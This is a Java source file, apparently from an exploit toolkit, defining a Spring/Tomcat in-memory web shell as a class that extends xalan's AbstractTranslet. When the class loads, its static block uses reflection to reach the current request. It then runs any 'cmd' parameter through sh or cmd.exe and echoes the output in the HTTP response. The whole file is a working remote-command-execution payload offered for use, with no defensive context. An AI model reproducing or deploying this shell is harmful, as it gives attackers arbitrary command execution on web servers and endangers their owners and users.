package org.exploit.MemShell.SpringMemShell.Generic;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.Response;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;

import javax.servlet.http.HttpServletRequest;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.Scanner;

public class SpringGenericMemShell extends AbstractTranslet {
    static{
        try{
            HttpServletRequest servletRequest =  ((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest();
            Field requestfield = RequestFacade.class.getDeclaredField("request");
            requestfield.setAccessible(true);
            Request request = (Request) requestfield.get(servletRequest);
            String cmd = request.getParameter("cmd") != null
                    ? request.getParameter("cmd")
                    : null;//获取cmd参数的值
            if (cmd != null) {//回显内容
                Response response = request.getResponse();
                java.io.Writer w = response.getWriter();
                Field usingWriter = Response.class.getDeclaredField("usingWriter");
                usingWriter.setAccessible(true);
                usingWriter.set(response, Boolean.FALSE);

                boolean isLinux = true;//执行命令
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\a");
                String output = s.hasNext() ? s.next() : "";
                w.write(output);
                w.flush();
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
